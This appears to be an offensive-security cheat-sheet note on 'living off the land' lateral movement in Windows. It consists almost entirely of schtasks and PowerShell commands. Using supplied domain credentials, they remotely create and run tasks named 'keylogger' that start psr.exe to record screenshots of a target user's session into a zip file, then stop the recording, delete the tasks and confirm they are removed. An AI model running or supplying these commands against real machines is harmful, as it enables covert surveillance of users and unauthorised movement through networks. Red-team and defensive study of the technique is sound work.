# Living off the Land

Search Tag(s): #lateral-movement #schedule-task #windows

## 01 - Manual

TODO: Fill this info

## 02 - Use Cases

- Taking screenshots via **Living off the Land (LofL)**

```
C:\> net time \\<IP>

PS C:\> Invoke-Command -ComputerName <IP> -ScriptBlock {Get-Date}

C:\> schtasks /create /tn "keylogger" /tr "C:\Windows\system32\psr.exe /start /gui 0 /output C:\path\to\file.zip" /sc once /st 00:00 /it [/ru <DOMAIN>\<username>] [/rp <password>] /s <target_IP>

C:\> schtasks /run /tn "keylogger" [/ru <DOMAIN>\<username>] [/rp <password>] /s <IP>
```

- Create schedule task to stop taking screenshots.

```
C:\> schtasks /create /tn "stop_keylogger" /tr "C:\Windows\system32\psr.exe /stop" /sc once /st 00:00 /it [/ru <DOMAIN>\<username>] [/rp <password>] /s <target_IP>

C:\> schtasks /run /tn "stop_keylogger" [/ru <DOMAIN>\<username>] [/rp <password>] /s <IP>
```

- Delete schedule tasks.

```
C:\> schtasks /delete /f /tn "keylogger" /s <IP>

C:\> schtasks /delete /f /tn "stop_keylogger" /s <IP>
```

- Confirm schedule tasks are removed.

```
C:\> schtasks /query /tn "keylogger" /fo List /v /s <IP>

C:\> schtasks /query /tn "stop_keylogger" /fo List /v /s <IP>
```

---
## References

- [Schtasks](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks)

- [Lateral Movement Windows and Active Directory](https://riccardoancarani.github.io/2019-10-04-lateral-movement-megaprimer/)